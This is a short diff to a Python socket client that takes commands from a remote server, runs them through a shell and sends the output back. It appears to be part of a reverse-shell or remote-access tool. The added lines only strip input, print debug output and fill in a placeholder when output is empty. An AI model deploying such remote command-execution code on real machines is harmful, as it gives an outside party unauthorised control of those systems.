@@ -29,7 +29,9 @@ class Client:
         """
 
         print(f'[+] Message received - {msg}')
+        msg = msg.strip()
         if msg.split(" ")[0] == 'cd':
+            print(f'length of msg = {len(msg)}')
             self.change_directory(msg)
         else:
             self.execute_command(msg)
@@ -58,6 +60,9 @@ class Client:
 
         command = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output = command.stdout.read() + command.stderr.read()
+        if len(output) == 0:
+            print(f'output is: {output}')
+            output = b'no actual return values'
         self.sock.send(output)
         print(f'[+] Sent command output to server - {output.decode()}')
 
